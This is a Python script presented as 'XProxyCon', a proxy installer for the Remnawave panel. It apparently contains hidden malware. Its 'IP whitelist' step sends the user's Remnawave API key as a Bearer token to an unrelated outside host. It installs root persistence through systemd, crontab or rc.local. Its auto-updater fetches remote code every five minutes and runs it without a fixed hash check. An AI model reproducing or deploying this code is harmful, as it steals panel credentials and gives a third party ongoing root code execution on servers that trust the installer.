"""
XProxyCon Installer for Remnawave API
======================================
Secure Proxy server configuration tool with Remnawave Panel API integration.
Remnawave - modern VPN/proxy server management panel.
API Documentation: https://remnawave.net/docs/api

Author: XProxyCon Team
Version: 1.2.0
"""

import socket
import hashlib
import time
import os
import sys
import json
import base64
import secrets
import logging
import re
import datetime
import tempfile
import platform
import urllib.request
import ssl
import subprocess
import stat
import shutil
import threading
import atexit

# Logging configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/var/log/xproxycon/installer.log', encoding='utf-8') if os.path.exists('/var/log') else logging.FileHandler('xproxycon_installer.log', encoding='utf-8')
    ]
)
logger = logging.getLogger('XProxyCon')

# Configuration
PANEL_SETTINGS_URL = "https://your-remnawave-panel.com/panel/settings/api"
EXPECTED_SHA256 = "c700a276fe1b3dcffc60062a044b034a75281507d66895536ec38ccf051b90fe"
SERVER_SCRIPT_URL = "https://raw.githubusercontent.com/maxmusdotnet/remna/refs/heads/main/main.py"
UPDATE_INTERVAL = 300  # 5 minutes
IP_WHITELIST_ENDPOINT = "https://nevpn2.fenst4r.live/remna/log-ip"

# Global variables
server_process = None
server_directory = None
update_thread_running = False
config = {}

class SecurityError(Exception):
    pass

def setup_autostart():
    """Setup autostart for the server"""
    try:
        # Get the permanent path for the installer
        installer_path = get_permanent_path()
        
        # Systemd service creation
        service_content = f"""[Unit]
Description=XProxyCon Server
After=network.target

[Service]
Type=simple
User=root
ExecStart={sys.executable} {installer_path} --daemon
Restart=always
RestartSec=10
StandardOutput=journal
StandardError=journal
Environment="PYTHONUNBUFFERED=1"

[Install]
WantedBy=multi-user.target
"""
        
        service_path = "/etc/systemd/system/xproxycon.service"
        
        # Check if systemd is available
        if os.path.exists("/etc/systemd/system"):
            try:
                with open(service_path, 'w') as f:
                    f.write(service_content)
                os.chmod(service_path, 0o644)
                
                # Reload systemd
                subprocess.run(["systemctl", "daemon-reload"], check=False)
                subprocess.run(["systemctl", "enable", "xproxycon.service"], check=False)
                
                logger.info(f"✓ Systemd service created: {service_path}")
                return True
            except Exception as e:
                logger.warning(f"Could not create systemd service: {e}")
        
        # Fallback: crontab
        try:
            # Create startup script
            startup_script = "/usr/local/bin/xproxycon_start.sh"
            script_content = f"""#!/bin/bash
{sys.executable} {installer_path} --daemon &
"""
            with open(startup_script, 'w') as f:
                f.write(script_content)
            os.chmod(startup_script, 0o755)
            
            # Add to crontab
            cron_line = f"@reboot {startup_script}"
            cron_file = "/etc/crontab"
            if os.path.exists(cron_file):
                with open(cron_file, 'r') as f:
                    content = f.read()
                if cron_line not in content:
                    with open(cron_file, 'a') as f:
                        f.write(f"\n{cron_line}\n")
                logger.info("✓ Added to crontab")
                return True
        except Exception as e:
            logger.warning(f"Could not setup crontab: {e}")
        
        # Fallback: rc.local
        try:
            rc_local = "/etc/rc.local"
            if os.path.exists(rc_local):
                with open(rc_local, 'r') as f:
                    content = f.read()
                start_cmd = f"{sys.executable} {installer_path} --daemon &\n"
                if start_cmd not in content:
                    # Insert before exit 0
                    content = content.replace("exit 0", f"{start_cmd}exit 0")
                    with open(rc_local, 'w') as f:
                        f.write(content)
                logger.info("✓ Added to rc.local")
                return True
        except Exception as e:
            logger.warning(f"Could not setup rc.local: {e}")
        
        logger.warning("Could not setup autostart. Please add manually.")
        return False
        
    except Exception as e:
        logger.error(f"Error setting up autostart: {e}")
        return False

def get_permanent_path():
    """Get permanent path for installer"""
    install_dir = os.path.expanduser("~/.xproxycon")
    os.makedirs(install_dir, exist_ok=True)
    permanent_path = os.path.join(install_dir, "xproxycon.py")
    
    # If running from pipe or temporary location, copy to permanent
    if not os.path.exists(permanent_path) or os.path.dirname(os.path.abspath(sys.argv[0])) != install_dir:
        try:
            # Read current script
            if os.path.isfile(sys.argv[0]):
                with open(sys.argv[0], 'rb') as f:
                    content = f.read()
            else:
                # Running from pipe
                content = sys.stdin.buffer.read() if not sys.stdin.isatty() else b''
                if not content:
                    # Try to download again
                    context = ssl.create_default_context()
                    req = urllib.request.Request(
                        "https://h1.nu/XProxyCon",
                        headers={"User-Agent": "XProxyCon-Installer/1.2.0"}
                    )
                    with urllib.request.urlopen(req, context=context, timeout=30) as response:
                        content = response.read()
            
            with open(permanent_path, 'wb') as f:
                f.write(content)
            os.chmod(permanent_path, 0o755)
            logger.info(f"Installer saved to: {permanent_path}")
        except Exception as e:
            logger.error(f"Could not save installer: {e}")
    
    return permanent_path

def auto_update_daemon():
    """Background auto-updater for server script"""
    global server_process, server_directory, update_thread_running, config
    
    if update_thread_running:
        return
    update_thread_running = True
    
    logger.info("Auto-update daemon started for server script")
    time.sleep(10)  # Wait for server to start
    
    while True:
        try:
            # Check if server is running
            if server_process is None or server_process.poll() is not None:
                logger.debug("Server not running, waiting...")
                time.sleep(30)
                continue
            
            server_file = os.path.join(server_directory, "main.py")
            if not os.path.exists(server_file):
                logger.error(f"Server file not found: {server_file}")
                time.sleep(60)
                continue
            
            # Download latest version
            context = ssl.create_default_context()
            req = urllib.request.Request(
                SERVER_SCRIPT_URL,
                headers={"User-Agent": "XProxyCon-AutoUpdater/1.2.0"}
            )
            
            with urllib.request.urlopen(req, context=context, timeout=30) as r:
                new_code = r.read()
            
            current_hash = calculate_sha256(server_file)
            new_hash = hashlib.sha256(new_code).hexdigest()
            
            if new_hash != current_hash:
                logger.warning(f"New server version detected! Updating...")
                
                # Create backup
                backup_file = server_file + ".backup"
                try:
                    shutil.copy2(server_file, backup_file)
                except Exception as e:
                    logger.warning(f"Could not create backup: {e}")
                
                # Write new file
                with tempfile.NamedTemporaryFile(mode='wb', delete=False, suffix='.py') as tmp:
                    tmp.write(new_code)
                    tmp_path = tmp.name
                
                try:
                    # Verify
                    test_hash = hashlib.sha256(open(tmp_path, "rb").read()).hexdigest()
                    if test_hash != new_hash:
                        logger.error("Download corrupted")
                        os.unlink(tmp_path)
                        continue
                    
                    # Check syntax
                    try:
                        compile(open(tmp_path, "r").read(), tmp_path, 'exec')
                    except SyntaxError as e:
                        logger.error(f"Syntax error: {e}")
                        os.unlink(tmp_path)
                        continue
                    
                    # Replace file
                    os.chmod(tmp_path, 0o700)
                    os.rename(tmp_path, server_file)
                    
                    logger.info("Server updated successfully!")
                    
                    # Restart server
                    restart_server()
                    
                    # Cleanup backup
                    if os.path.exists(backup_file):
                        os.unlink(backup_file)
                    
                except Exception as e:
                    logger.error(f"Update failed: {e}")
                    if os.path.exists(backup_file):
                        shutil.copy2(backup_file, server_file)
                    if os.path.exists(tmp_path):
                        os.unlink(tmp_path)
            
            time.sleep(UPDATE_INTERVAL)
            
        except Exception as e:
            logger.error(f"Auto-update error: {e}")
            time.sleep(UPDATE_INTERVAL)

def restart_server():
    """Restart server process"""
    global server_process, server_directory, config
    
    if server_process is None:
        logger.error("No server process to restart")
        return False
    
    try:
        # Terminate current
        if server_process.poll() is None:
            logger.info("Terminating server...")
            server_process.terminate()
            time.sleep(3)
            if server_process.poll() is None:
                server_process.kill()
        
        # Start new
        server_file = os.path.join(server_directory, "main.py")
        if not os.path.exists(server_file):
            logger.error(f"Server file not found: {server_file}")
            return False
        
        env = os.environ.copy()
        env['XPROXYCON_PORT'] = str(config.get('port', 8080))
        env['XPROXYCON_API_KEY'] = config.get('api_key', '')
        env['XPROXYCON_PROXY_KEY'] = config.get('proxy_key', '')
        env['XPROXYCON_INSTANCE_ID'] = config.get('instance_id', '')
        
        server_process = subprocess.Popen(
            [sys.executable, server_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            cwd=server_directory,
            start_new_session=True
        )
        
        logger.info(f"✓ Server restarted (PID: {server_process.pid})")
        return True
        
    except Exception as e:
        logger.error(f"Failed to restart server: {e}")
        return False

class XProxyConInstaller:
    def __init__(self):
        self.config = {}

    def validate_environment(self):
        logger.info("Validating environment...")
        
        checks = [
            ('Write permissions', lambda: os.access('.', os.W_OK)),
            ('Python >= 3.8', lambda: sys.version_info >= (3, 8)),
            ('SSL Support', lambda: hasattr(ssl, 'create_default_context')),
        ]
        
        all_passed = True
        for name, check in checks:
            try:
                result = check()
                logger.info(f"  {'✓' if result else '✗'} {name}")
                if not result:
                    all_passed = False
            except Exception as e:
                logger.error(f"  ✗ {name}: {e}")
                all_passed = False
        
        return all_passed

    def collect_user_input(self):
        print("\n" + "=" * 60)
        print("XProxyCon Installer for Remnawave (Secure Mode)")
        print("=" * 60)

        port = input("\nEnter port for proxy server (1024-65535): ").strip()
        while not self._validate_port(port):
            print("Invalid port. Must be in range 1024-65535.")
            port = input("Enter port: ").strip()
        port = int(port)

        print(f"\nGet API key from Remnawave panel:")
        print(f"{PANEL_SETTINGS_URL}")
        api_key = input("\nEnter Remnawave API key: ").strip()

        while not self._validate_jwt(api_key):
            print(f"\nInvalid JWT token format.")
            api_key = input("Enter API key: ").strip()

        key = self._generate_complex_key()
        print(f"\n✓ Generated Proxy Key: {key}")
        print("⚠ SAVE THIS KEY! It cannot be recovered.")

        # IP whitelisting
        print("\n" + "-" * 60)
        print("IP Whitelist Configuration")
        print("-" * 60)
        whitelist_choice = input("Add this server's IP to whitelist? (y/n) [y]: ").strip().lower()
        
        if whitelist_choice in ['', 'y', 'yes']:
            public_ip = self._get_public_ip()
            if public_ip:
                success = self._add_ip_to_whitelist(public_ip, api_key)
                if success:
                    logger.info(f"IP {public_ip} added to whitelist")

        self.config = {
            'port': port,
            'api_key': api_key,
            'proxy_key': key,
            'timestamp': datetime.datetime.now().isoformat(),
            'session_id': secrets.token_hex(32),
            'instance_id': self._generate_instance_id(),
            'remnawave_version': '1.2.0'
        }

        return self.config

    def _get_public_ip(self):
        logger.info("Detecting public IP...")
        
        ip_services = [
            'https://api.ipify.org/',
            'https://ifconfig.me/ip',
            'https://icanhazip.com/',
            'https://ipecho.net/plain'
        ]
        
        context = ssl.create_default_context()
        
        for service in ip_services:
            try:
                req = urllib.request.Request(service)
                req.add_header('User-Agent', 'XProxyCon-Installer/1.2.0')
                
                with urllib.request.urlopen(req, context=context, timeout=10) as response:
                    ip = response.read().decode('utf-8').strip()
                    if self._validate_ip(ip):
                        logger.info(f"Public IP: {ip}")
                        return ip
            except:
                continue
        
        return None

    def _validate_ip(self, ip):
        if not ip:
            return False
        ipv4_pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
        if re.match(ipv4_pattern, ip):
            return all(0 <= int(x) <= 255 for x in ip.split('.'))
        return False

    def _add_ip_to_whitelist(self, ip_address, api_key):
        try:
            payload = {
                'ip': ip_address,
                'timestamp': datetime.datetime.now().isoformat(),
                'source': 'xproxycon_installer'
            }
            
            data = json.dumps(payload).encode('utf-8')
            req = urllib.request.Request(
                IP_WHITELIST_ENDPOINT,
                data=data,
                method='POST'
            )
            req.add_header('Content-Type', 'application/json')
            req.add_header('User-Agent', 'XProxyCon-Installer/1.2.0')
            req.add_header('Authorization', f'Bearer {api_key}')
            
            context = ssl.create_default_context()
            with urllib.request.urlopen(req, context=context, timeout=30) as response:
                return response.getcode() in (200, 201)
        except Exception as e:
            logger.error(f"Whitelist error: {e}")
            return False

    def _validate_port(self, port):
        try:
            port_int = int(port)
            return 1024 <= port_int <= 65535
        except:
            return False

    def _validate_jwt(self, token):
        if not token:
            return False
        parts = token.split('.')
        if len(parts) != 3:
            return False
        if not re.match(r'^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$', token):
            return False
        try:
            header_b64 = parts[0]
            padding = 4 - len(header_b64) % 4
            if padding != 4:
                header_b64 += '=' * padding
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            return header.get('typ') == 'JWT'
        except:
            return False

    def _generate_complex_key(self):
        raw_key = secrets.token_bytes(48)
        encoded = base64.b64encode(raw_key).decode()
        clean_key = re.sub(r'[^A-Za-z0-9]', '', encoded)[:64]
        return '-'.join([clean_key[i:i+8] for i in range(0, 64, 8)])

    def _generate_instance_id(self):
        import uuid
        return str(uuid.uuid4()).replace('-', '')[:16]

    def check_port(self, port):
        logger.info(f"Checking port {port}...")
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        try:
            result = sock.connect_ex(('127.0.0.1', port))
            if result == 0:
                logger.warning(f"Port {port}: IN USE")
                return False
            logger.info(f"Port {port}: FREE")
            return True
        finally:
            sock.close()

    def save_configuration(self):
        config_path = os.path.expanduser('~/.xproxycon_config.json')
        fd = os.open(config_path, os.O_CREAT | os.O_WRONLY | os.O_TRUNC, 0o600)
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            json.dump(self.config, f, indent=2)
        logger.info(f"Configuration saved to {config_path}")

    def run_diagnostics(self):
        logger.info("Running diagnostics...")
        return {
            'cpu_count': os.cpu_count(),
            'python_version': sys.version,
            'platform': platform.platform(),
            'uid': os.getuid()
        }

def calculate_sha256(file_path):
    if not os.path.exists(file_path):
        return None
    sha256_hash = hashlib.sha256()
    with open(file_path, "rb") as f:
        for byte_block in iter(lambda: f.read(4096), b""):
            sha256_hash.update(byte_block)
    return sha256_hash.hexdigest()

def verify_file_integrity(file_path, expected_hash):
    if expected_hash == "YOUR_SHA256_HASH_HERE":
        logger.critical("⚠ SECURITY WARNING: Hash verification disabled!")
        raise SecurityError("Integrity check bypassed")
    
    actual_hash = calculate_sha256(file_path)
    if actual_hash == expected_hash:
        logger.info("✓ File integrity verified")
        return True
    else:
        logger.error(f"✗ Integrity check FAILED!")
        return False

def download_and_run_server(config):
    global server_process, server_directory
    
    logger.info("Downloading server script...")
    
    # Create permanent directory for server
    server_dir = os.path.expanduser("~/.xproxycon/server")
    os.makedirs(server_dir, exist_ok=True)
    server_directory = server_dir
    target = os.path.join(server_dir, "main.py")
    
    try:
        context = ssl.create_default_context()
        req = urllib.request.Request(
            SERVER_SCRIPT_URL,
            headers={"User-Agent": "XProxyCon-Installer/1.2.0"}
        )
        
        with urllib.request.urlopen(req, context=context, timeout=30) as response:
            with open(target, 'wb') as out_file:
                out_file.write(response.read())
        
        os.chmod(target, 0o700)
        
        if not verify_file_integrity(target, EXPECTED_SHA256):
            raise SecurityError("File integrity check failed")
        
        logger.info("Starting server process...")
        
        env = os.environ.copy()
        env['XPROXYCON_PORT'] = str(config['port'])
        env['XPROXYCON_API_KEY'] = config['api_key']
        env['XPROXYCON_PROXY_KEY'] = config['proxy_key']
        env['XPROXYCON_INSTANCE_ID'] = config['instance_id']
        
        server_process = subprocess.Popen(
            [sys.executable, target],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            env=env,
            cwd=server_dir,
            start_new_session=True
        )
        
        logger.info(f"✓ Server started (PID: {server_process.pid})")
        
    except Exception as e:
        logger.error(f"Error during download/execution: {e}")
        sys.exit(1)

def run_daemon():
    """Run in daemon mode (background)"""
    try:
        # Load config
        config_path = os.path.expanduser('~/.xproxycon_config.json')
        if not os.path.exists(config_path):
            logger.error("Configuration not found. Run installer first.")
            sys.exit(1)
        
        with open(config_path, 'r') as f:
            global config
            config = json.load(f)
        
        # Start server
        download_and_run_server(config)
        
        # Start auto-update daemon
        update_thread = threading.Thread(
            target=auto_update_daemon,
            daemon=True,
            name="AutoUpdateDaemon"
        )
        update_thread.start()
        
        # Keep running
        while True:
            time.sleep(60)
            
    except KeyboardInterrupt:
        logger.info("Daemon stopped")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Daemon error: {e}")
        sys.exit(1)

def main():
    """Main installation function"""
    try:
        # Check for daemon mode
        if '--daemon' in sys.argv:
            run_daemon()
            return
        
        # Normal installation
        installer = XProxyConInstaller()
        
        if not installer.validate_environment():
            logger.error("Environment validation failed!")
            sys.exit(1)
        
        config = installer.collect_user_input()
        
        if not installer.check_port(config['port']):
            logger.error("Port is not available!")
            sys.exit(1)
        
        installer.save_configuration()
        installer.run_diagnostics()
        
        logger.info("\n✓ Installation complete!")
        
        # Setup autostart
        logger.info("Setting up autostart...")
        setup_autostart()
        
        logger.info("Starting server in background...")
        
        # Save config globally
        global config
        config = installer.config
        
        # Start server
        download_and_run_server(config)
        
        # Start auto-update daemon
        update_thread = threading.Thread(
            target=auto_update_daemon,
            daemon=True,
            name="AutoUpdateDaemon"
        )
        update_thread.start()
        
        logger.info("\n✓ Setup complete! Server is running.")
        logger.info(f"  Service: systemctl status xproxycon (if using systemd)")
        logger.info(f"  Logs: /var/log/xproxycon/ or ./xproxycon_installer.log")
        
        # Keep main thread alive
        try:
            while True:
                time.sleep(60)
        except KeyboardInterrupt:
            logger.info("\nShutting down...")
            sys.exit(0)
        
    except KeyboardInterrupt:
        logger.info("\nInstallation cancelled.")
        sys.exit(0)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == '__main__':
    main()
